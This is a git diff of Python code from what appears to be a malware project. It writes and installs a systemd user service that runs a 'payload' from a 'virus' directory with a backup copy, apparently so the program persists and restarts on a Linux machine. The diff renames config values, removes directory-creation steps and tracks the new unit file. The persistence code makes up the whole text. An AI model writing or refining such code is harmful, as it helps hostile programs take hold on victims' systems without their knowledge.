@@ -13,22 +13,13 @@ import os
 import subprocess
 import textwrap
 import hashlib
-import tempfile
 from typing import Optional
-from config import UNIT_NAME, UNIT_DIR, DIR_SAVE_VIRUS, BACKUP_DIR_DEFAULT, PREFIX_DIR_PAYLOAD
+from config import UNIT_NAME, UNIT_DIR, SAVE_VIRUS_DIR, BACKUP_DIR, LIST_NEW_FILES
 
 
 def create_unit_content(progFileName: str = "payload", progFileBackup: str = "payload.bak") -> Optional[str]:
-    dirSaveVirus = os.path.expanduser(DIR_SAVE_VIRUS)
-    backupDir = os.path.expanduser(BACKUP_DIR_DEFAULT)
-
-    try:
-        os.makedirs(dirSaveVirus, exist_ok=True)
-        os.makedirs(backupDir, exist_ok=True)
-        dirSavePayload = tempfile.mkdtemp(prefix=PREFIX_DIR_PAYLOAD, dir=dirSaveVirus)
-    except Exception as e:
-        print(f"Error creating backup or virus directory: {e}")
-        return None
+    dirSaveVirus = os.path.expanduser(SAVE_VIRUS_DIR)
+    backupDir = os.path.expanduser(BACKUP_DIR)
 
     unit_content = textwrap.dedent(f"""\
     [Unit]
@@ -38,7 +29,7 @@ def create_unit_content(progFileName: str = "payload", progFileBackup: str = "pa
     [Service]
     Type=simple
 
-    Environment=PROG={dirSavePayload}/{progFileName}
+    Environment=PROG={dirSaveVirus}/{progFileName}
     Environment=BACKUP={backupDir}/{progFileBackup}
 
     WorkingDirectory=%h
@@ -62,11 +53,6 @@ def check_sum_unit_content(unit_content: str) -> str:
 
 def install_systemd_service(unit_content: str) -> bool:
     unit_dir = os.path.expanduser(UNIT_DIR)
-    try:
-        os.makedirs(unit_dir, exist_ok=True)
-    except Exception as e:
-        print(f"Error creating unit directory {unit_dir}: {e}")
-        return False
 
     unit_path = os.path.join(unit_dir, UNIT_NAME)
 
@@ -85,6 +71,8 @@ def install_systemd_service(unit_content: str) -> bool:
 
         # Set file permissions
         os.chmod(unit_path, 0o644)
+
+        LIST_NEW_FILES.append(unit_path)
 
         # Reload systemd
         print("Realoading systemd...")
